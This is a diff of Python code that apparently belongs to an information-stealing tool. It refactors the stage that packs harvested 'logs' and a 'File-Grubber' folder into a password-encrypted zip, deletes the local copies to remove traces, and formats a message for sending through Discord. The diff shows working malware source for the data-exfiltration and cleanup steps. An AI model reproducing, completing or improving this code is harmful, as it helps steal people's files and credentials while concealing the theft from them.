@@ -38,7 +38,7 @@ def MakeZip():
     
     try:
         chdir(environ["TEMP"])
-        make_archive("logs", "zip", join(environ["USERPROFILE"], config.pathToLogs))
+        make_archive("logs", "zip", config.pathToLogs)
         result_path = join(environ["TEMP"], f"{name}.zip")
 
         with AESZipFile(result_path, "w", compression=ZIP_STORED, encryption=WZ_AES) as logs:
@@ -51,9 +51,9 @@ def MakeZip():
         return None
 
 
-def Clean(user) -> None:
-    rmtree(f'{user}\\{config.pathToLogs}\\Files\\File-Grubber', ignore_errors=True)
-    rmtree(f'{user}\\{config.pathToLogs}', ignore_errors=True)
+def Clean() -> None:
+    rmtree(join(config.pathToLogs, "Files", "File-Grubber"), ignore_errors=True)
+    rmtree(config.pathToLogs, ignore_errors=True)
 
 def MsgForDiscord(message, url) -> str:
     message = message.replace('<b>', '**')
@@ -71,13 +71,12 @@ def MsgForDiscord(message, url) -> str:
 
 
 def Send(sendData, msgInfo) -> None:
-    user = environ['USERPROFILE']
     zipInfo = []
     url = None
     Log("===========Conclusion===========")
 
     zipInfo = MakeZip()
-    Clean(user)
+    Clean()
     if not zipInfo: return None
 
     file_name = basename(zipInfo[0])
